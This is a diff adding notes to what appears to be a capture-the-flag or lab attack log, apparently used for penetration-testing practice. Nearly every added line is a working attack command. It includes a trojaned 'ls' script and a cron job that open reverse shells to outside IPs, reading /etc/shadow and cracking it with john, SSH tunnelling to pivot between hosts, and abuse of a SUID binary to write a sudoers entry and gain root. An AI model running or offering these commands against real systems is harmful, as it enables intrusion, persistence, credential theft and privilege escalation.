@@ -166,43 +166,37 @@ whoami >> /var/tmp/output.txt
 cat /home/billybob/* >> /var/tmp/output.txt
 cat output.txt
 
+vim ls
+______________
+#! /bin/bash
+/bin/bash -i > /dev/tcp/10.50.31.135/9571 0<&1 2>&1
+______________
+nc -nvlp 9571
+
+/bin/ls
+cat /etc/shadow
+john --wordlist:millionpasswds.txt rootpasswd.txt
+ghjcnbnenrf
+ssh zeus@localhost -p 10021
+
+crontab -e
+* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
 
 
+ssh -MS /tmp/t2 comrade@127.0.0.1 -p 10021
+ssh -S /tmp/t2 dum -O forward -L 10030:192.168.28.12:22
+ssh comrade@localhost -p 10030
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+find / -type f -perm /6000 -ls 2>/dev/null
+## found /var/tmp/testbed/unknown
+cd /var/tmp/testbed
+## Tested Unknown to see what it does
+./unknown 
+## Discovered it Appends to files
+./unknown /etc/sudoers 'comrade ALL=(ALL:ALL) ALL'
+## have sudo privs
+sudo su root
+or
+sudo ls -l /root
+sudo cat /root/flag
+```
